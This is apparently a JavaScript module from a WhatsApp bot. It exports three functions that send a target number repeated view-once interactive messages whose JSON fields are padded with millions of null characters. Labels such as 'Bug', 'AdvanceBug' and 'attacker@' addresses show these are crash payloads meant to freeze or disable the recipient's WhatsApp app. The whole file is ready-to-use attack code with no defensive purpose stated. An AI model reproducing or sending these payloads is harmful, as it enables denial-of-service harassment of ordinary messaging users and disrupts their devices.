exports.beta2 = async (ekuzika, target) => {
    for (let i = 0; i < 10; i++) {
        await ekuzika.relayMessage(target, 
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "Tau sc Bug EkuXBranz?",
                                format: "EXTENSIONS_1"
                            },
                            nativeFlowResponseMessage: {
                                name: 'galaxy_message',
                                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zetxcza.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(9020000)}\",\"screen_0_TextInput_1\":\"Sv EkuXBranz\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                                version: 3
                            }
                        }
                    }
                }
            }, 
            { participant: { jid: target } }
        );
    }
}


exports.beta1 = async (ekuzika, target) => {
    for (let i = 0; i < 10; i++) {
        await ekuzika.relayMessage(target, 
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "Misii pakettt...",
                                format: "EXTENSIONS_1"
                            },
                            nativeFlowResponseMessage: {
                                name: 'galaxy_message',
                                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@ekuzikatzy.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(9020000)}\",\"screen_0_TextInput_1\":\"Misiiii\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                                version: 3
                            }
                        }
                    }
                }
            }, 
            { participant: { jid: target } }
        );
    }
}

exports.buk1 = async (ekuzika, target, text, amount, ptcp = false) => {
    await ekuzika.relayMessage(target, 
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: text,
                            format: "EXTENSIONS_1"
                        },
                        nativeFlowResponseMessage: {
                            name: 'galaxy_message',
                            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(amount)}\",\"screen_0_TextInput_1\":\"Pakettt omm\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                            version: 3
                        }
                    }
                }
            }
        }, 
        ptcp ? { participant: { jid: target } } : {}
    );
};